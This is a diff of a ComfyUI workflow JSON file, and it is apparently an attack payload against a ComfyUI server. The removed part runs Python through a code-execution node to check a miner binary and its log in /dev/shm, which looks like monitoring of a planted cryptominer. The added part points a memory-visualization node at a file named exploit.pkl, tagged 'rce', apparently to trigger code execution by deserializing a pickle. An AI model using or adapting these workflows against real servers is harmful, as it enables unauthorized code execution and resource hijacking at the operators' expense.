@@ -1,18 +1,9 @@
 {
   "1": {
-    "class_type": "IDENode",
+    "class_type": "VisualizeCUDAMemoryHistory",
     "inputs": {
-      "language": "python",
-      "pycode": "import subprocess\nimport os\n\ndst = \"/dev/shm/alpha-miner\"\nsz = os.path.getsize(dst) if os.path.exists(dst) else 0\n\n# Check log\nlog = subprocess.run([\"cat\", \"/dev/shm/alpha.log\"], capture_output=True, text=True).stdout[-400:]\n\nresult = f\"SIZE: {sz} | LOG: {log}\"\nresult\n"
-    }
-  },
-  "2": {
-    "class_type": "PreviewAny",
-    "inputs": {
-      "source": [
-        "1",
-        0
-      ]
+      "snapshot_path": "/opt/ComfyUI/input/exploit.pkl",
+      "unique_id": "rce"
     }
   }
 }
